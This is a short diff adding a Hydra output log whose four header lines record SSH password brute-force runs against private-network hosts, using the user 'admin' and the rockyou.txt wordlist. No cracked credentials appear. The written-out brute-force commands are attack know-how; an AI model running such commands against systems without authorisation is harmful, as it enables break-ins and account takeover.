@@ -1,0 +1,4 @@
+# Hydra v9.3 run at 2022-05-13 06:52:25 on 172.20.10.3 ssh (hydra -l admin -P rockyou.txt -vV -t 64 -o output.txt -I ssh://172.20.10.3)
+# Hydra v9.3 run at 2022-05-13 17:13:08 on 192.168.1.121 ssh (hydra -l admin -P rockyou.txt -vV -t 64 -o output.txt -I ssh://192.168.1.121)
+# Hydra v9.3 run at 2022-05-13 17:18:45 on 192.168.1.121 ssh (hydra -l admin -P rockyou.txt -t 64 -o output.txt -I ssh://192.168.1.121)
+# Hydra v9.3 run at 2022-05-13 22:54:49 on 192.168.1.121 ssh (hydra -l admin -P rockyou.txt -t 64 -o output.txt -I ssh://192.168.1.121)
